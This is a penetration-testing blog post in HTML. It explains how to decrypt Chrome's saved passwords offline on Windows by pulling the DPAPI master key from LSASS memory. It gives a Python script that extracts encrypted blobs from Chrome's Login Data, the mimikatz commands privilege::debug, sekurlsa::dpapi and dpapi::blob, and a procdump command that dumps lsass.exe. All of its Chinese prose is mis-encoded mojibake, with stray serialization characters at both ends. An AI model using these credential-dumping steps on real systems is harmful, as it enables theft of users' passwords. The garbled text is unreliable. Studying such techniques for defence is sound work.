I"…!<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€Šæ¸—é€æŠ€å·§â€”â€”ç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ã€‹</a>æ›¾å¾—å‡ºç»“è®ºï¼š<code class="language-plaintext highlighter-rouge">ä½¿ç”¨ç”¨æˆ·çš„ntlm hashï¼Œæ— æ³•å¯¼å‡ºChromeæµè§ˆå™¨ä¿å­˜çš„æ˜æ–‡å¯†ç </code>ã€‚</p>

<p>è€Œç›®å‰çš„Windowsç³»ç»Ÿ(å¦‚Windows Server 2012)ï¼Œé»˜è®¤æ— æ³•å¯¼å‡ºç”¨æˆ·çš„æ˜æ–‡å£ä»¤ï¼Œåªèƒ½è·å¾—ntlm hashã€‚</p>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿è·å¾—äº†ç³»ç»Ÿçš„è®¿é—®æƒé™ï¼Œå¦‚æœæ— æ³•è·å¾—æ˜æ–‡å£ä»¤ï¼Œé€šè¿‡æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€Šæ¸—é€æŠ€å·§â€”â€”ç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ã€‹</a>ä»‹ç»çš„æ–¹æ³•è¿˜æ˜¯æ— æ³•ç¦»çº¿(ä½†å¯ä»¥åœ¨çº¿)å¯¼å‡ºChromeæµè§ˆå™¨ä¿å­˜çš„æ˜æ–‡å¯†ç ã€‚</p>

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä¸€ç§æ–°æ–¹æ³•ï¼Œåˆ©ç”¨Masterkeyç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ï¼Œä¸éœ€è¦è·å¾—ç”¨æˆ·çš„æ˜æ–‡å£ä»¤ï¼Œå¹¶ä¸”å¾—å‡ºæ–°çš„ç»“è®ºã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åŸºç¡€æ¦‚å¿µ</li>
  <li>è§£å¯†æ€è·¯</li>
  <li>å¯¼å‡ºæ–¹æ³•</li>
  <li>å®é™…æµ‹è¯•</li>
</ul>

<h2 id="0x02-åŸºç¡€æ¦‚å¿µ">0x02 åŸºç¡€æ¦‚å¿µ</h2>
<hr />

<h4 id="dpapi">DPAPIï¼š</h4>

<p>å…¨ç§°Data Protection Application Programming Interface</p>

<h4 id="dpapi-blob">DPAPI blobï¼š</h4>

<p>ä¸€æ®µå¯†æ–‡ï¼Œå¯ä½¿ç”¨Master Keyå¯¹å…¶è§£å¯†</p>

<h4 id="master-key">Master Keyï¼š</h4>

<p>64å­—èŠ‚ï¼Œç”¨äºè§£å¯†DPAPI blobï¼Œä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç ã€SIDå’Œ16å­—èŠ‚éšæœºæ•°åŠ å¯†åä¿å­˜åœ¨Master Key fileä¸­</p>

<h4 id="master-key-file">Master Key fileï¼š</h4>

<p>äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç å¯¹å…¶è§£å¯†ï¼Œè·å¾—Master Key</p>

<h2 id="0x03-dpapiè§£å¯†æ€è·¯">0x03 DPAPIè§£å¯†æ€è·¯</h2>
<hr />

<h3 id="1å®šä½åŠ å¯†çš„master-key-file">1ã€å®šä½åŠ å¯†çš„Master Key file</h3>

<p>æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">ã€Šæ¸—é€æŠ€å·§â€”â€”ç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ã€‹</a>æ›¾å¾—å‡ºç»“è®ºï¼š<code class="language-plaintext highlighter-rouge">æ— æ³•å®šä½è§£å¯†Chromeæ•°æ®åº“å¯¹åº”çš„Master Key file</code></p>

<p>è¯¥ç»“è®ºæœ‰è¯¯ï¼Œå®é™…ä¸Šèƒ½å¤Ÿå¯¹å…¶å®šä½ï¼Œæ–¹æ³•è§0x04</p>

<h3 id="2ä»lsassè¿›ç¨‹æå–å‡ºmaster-key">2ã€ä»lsassè¿›ç¨‹æå–å‡ºMaster Key</h3>

<p>æ­¤å¤„æ¢äº†ä¸€ç§æ€è·¯ï¼Œå› æ­¤ä¸éœ€è¦ç”¨æˆ·çš„æ˜æ–‡å£ä»¤</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ç¦»çº¿ä»Master Key fileæå–å‡ºMaster Keyï¼Œå¿…é¡»è¦è·å¾—ç”¨æˆ·çš„æ˜æ–‡å£ä»¤</p>

<h3 id="3ä½¿ç”¨master-keyè§£å¯†dpapi-blobè·å¾—æ˜æ–‡">3ã€ä½¿ç”¨Master Keyè§£å¯†DPAPI blobï¼Œè·å¾—æ˜æ–‡</h3>

<h2 id="0x04-å®ç°æ–¹æ³•">0x04 å®ç°æ–¹æ³•</h2>
<hr />

<p>æµ‹è¯•ç³»ç»Ÿï¼š</p>

<p>Win7 x86</p>

<h3 id="1ä½¿ç”¨pythonè¯»å–æ•°æ®åº“æ–‡ä»¶å¹¶æå–å‡ºå¯†æ–‡">1ã€ä½¿ç”¨pythonè¯»å–æ•°æ®åº“æ–‡ä»¶å¹¶æå–å‡ºå¯†æ–‡</h3>

<p>ä½¿ç”¨pythonè„šæœ¬è¯»å–Login Dataå¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
import sqlite3
import binascii
conn = sqlite3.connect("Login Data")
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    print (binascii.b2a_hex(result[2]))
    f = open('test.txt', 'wb')
    f.write(result[2])
    f.close()
</code></pre></div></div>

<p>è„šæœ¬æ‰§è¡Œåï¼Œæå–Login Dataä¸­ä¿å­˜çš„å¯†æ–‡ï¼Œä¿å­˜ä¸ºtest.txt</p>

<h3 id="2è·å¾—è¯¥å¯†æ–‡å¯¹åº”çš„master-key-file">2ã€è·å¾—è¯¥å¯†æ–‡å¯¹åº”çš„Master Key file</h3>

<p>mimikatzå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
</code></pre></div></div>

<p>è·å¾—å¯¹åº”guidMasterkeyä¸º<code class="language-plaintext highlighter-rouge">{a111b0f6-b4d7-40c8-b536-672a8288b958}</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-1.png" alt="Alt text" /></p>

<p>å³Master Key fileçš„è·¯å¾„ä¸º<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958</code></p>

<h3 id="3ä»lsassè¿›ç¨‹æå–å‡ºmaster-key">3ã€ä»lsassè¿›ç¨‹æå–å‡ºMaster Key</h3>

<h4 id="1-åœ¨çº¿æ–¹å¼">(1) åœ¨çº¿æ–¹å¼</h4>

<p>éœ€è¦ç®¡ç†å‘˜æƒé™</p>

<p>mimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
sekurlsa::dpapi
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-2.png" alt="Alt text" /></p>

<p>æå–å‡ºMaster Keyä¸º<code class="language-plaintext highlighter-rouge">666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70</code></p>

<h4 id="2-ç¦»çº¿æ–¹å¼">(2) ç¦»çº¿æ–¹å¼</h4>

<p>ä½¿ç”¨procdump dumpå‡ºLSASSè¿›ç¨‹å†…å­˜</p>

<p>procdumpä¸‹è½½åœ°å€ï¼š</p>

<p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>

<p>ç®¡ç†å‘˜æƒé™ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre></div></div>

<p>ä½¿ç”¨mimikatzåŠ è½½dmpæ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>mimikatzä»lsassè¿›ç¨‹æå–å‡ºMaster Keyåï¼Œä¼šè‡ªåŠ¨å°†Master KeyåŠ å…¥ç³»ç»Ÿç¼“å­˜</p>

<h3 id="4ä½¿ç”¨masterkeyè§£å¯†">4ã€ä½¿ç”¨masterkeyè§£å¯†</h3>

<p>mimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
</code></pre></div></div>

<p>æˆåŠŸè·å¾—æ˜æ–‡ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-3.png" alt="Alt text" /></p>

<p>æ•°æ®æ­£ç¡®ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-4.png" alt="Alt text" /></p>

<h2 id="0x05-åˆ©ç”¨åˆ†æ">0x05 åˆ©ç”¨åˆ†æ</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»çš„æ–¹æ³•æ˜¯åˆ©ç”¨lsassè¿›ç¨‹è¿˜åŸå‡ºMaster Keyï¼Œå› æ­¤ä¸éœ€è¦è·å–åˆ°ç”¨æˆ·çš„æ˜æ–‡å¯†ç </p>

<p>åŒæ—¶ï¼Œé…åˆprocdumpï¼Œä¸éœ€è¦åœ¨æµ‹è¯•ç³»ç»Ÿä¸Šæ‰§è¡Œmimikatzï¼Œåªéœ€è¦è·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸¤ä¸ªæ–‡ä»¶ï¼šlsassè¿›ç¨‹çš„dmpæ–‡ä»¶å’ŒLogin Dataæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°ä½¿ç”¨mimikatzè¿˜åŸå‡ºMaster Keyï¼Œè§£å¯†è·å¾—æ˜æ–‡</p>

<p>å¹¶ä¸”ï¼Œä¸éœ€è¦ä»Systemæƒé™é™æƒåˆ°å½“å‰ç”¨æˆ·æƒé™</p>

<p>ç»¼ä¸Šï¼Œç¦»çº¿å¯¼å‡ºçš„å®Œæ•´æ€è·¯å¦‚ä¸‹ï¼š</p>

<h4 id="1è·å¾—ç”¨æˆ·ç³»ç»Ÿchromeä¿å­˜å¯†ç çš„sqliteæ•°æ®åº“æ–‡ä»¶ä½äºlocalappdatagooglechromeuser-datadefaultlogin-data">1ã€è·å¾—ç”¨æˆ·ç³»ç»ŸChromeä¿å­˜å¯†ç çš„SQLiteæ•°æ®åº“æ–‡ä»¶ï¼Œä½äº<code class="language-plaintext highlighter-rouge">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></h4>

<h4 id="2è·å¾—lsassè¿›ç¨‹çš„å†…å­˜æ–‡ä»¶">2ã€è·å¾—lsassè¿›ç¨‹çš„å†…å­˜æ–‡ä»¶</h4>

<h4 id="3åœ¨æœ¬åœ°ä½¿ç”¨mimikatzæå–master-keyè§£å¯†login-dataè·å¾—æ˜æ–‡">3ã€åœ¨æœ¬åœ°ä½¿ç”¨mimikatzæå–Master Keyï¼Œè§£å¯†Login Dataè·å¾—æ˜æ–‡</h4>

<h2 id="0x06-æœ€ç»ˆç»“è®º">0x06 æœ€ç»ˆç»“è®º</h2>
<hr />

<h3 id="1èƒ½å¤Ÿå®šä½master-key-file">1ã€èƒ½å¤Ÿå®šä½Master Key file</h3>

<p>æ–¹æ³•1:</p>

<p>mimikatzå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
</code></pre></div></div>

<p>æ–¹æ³•2ï¼š</p>

<p>é€šè¿‡è¯»å–æ–‡ä»¶Preferredçš„å‰16å­—èŠ‚è·å¾—å¯¹åº”çš„Master Key file</p>

<h3 id="2ä¸éœ€è¦ç”¨æˆ·æ˜æ–‡å£ä»¤ä¹Ÿèƒ½ç¦»çº¿å¯¼å‡ºchromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ">2ã€ä¸éœ€è¦ç”¨æˆ·æ˜æ–‡å£ä»¤ä¹Ÿèƒ½ç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç </h3>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†å¦‚ä½•åˆ©ç”¨Masterkeyç¦»çº¿å¯¼å‡ºChromeæµè§ˆå™¨ä¸­ä¿å­˜çš„å¯†ç ï¼Œç›¸æ¯”äºä¹‹å‰çš„æ–¹æ³•ï¼Œæ›´åŠ é€šç”¨</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET